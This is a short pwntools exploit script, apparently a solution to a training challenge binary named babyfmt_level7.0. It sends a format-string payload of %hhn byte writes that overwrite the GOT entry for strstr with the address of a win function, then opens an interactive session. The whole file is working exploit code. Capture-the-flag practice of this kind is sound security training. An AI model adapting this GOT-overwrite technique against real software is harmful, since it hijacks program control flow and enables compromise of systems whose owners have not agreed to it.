from pwn import * 

binary = './babyfmt_level7.0'

p = process(binary)

s = '''
b * printf
b * main+423
'''



#gdb.attach(p, s)

# 0x   c8c5   6078  8cd2  5937

win = 0x00401540

strstr = 0x404088


payload = flat(
	"%64c%75$hhn",
	"%213c%76$hhn",
	"%43c%77$hhn",
	"%192c%78$hhn",
	"%256c%79$hhn",
	"%256c%80$hhn----------------------------------",
	p64(strstr),
	p64(strstr+1),
	p64(strstr+2),
	p64(strstr+3),
	p64(strstr+4),
	p64(strstr+5)
)
#gdb.attach(p, s)

p.sendline(payload)



p.sendline("END")



p.interactive()
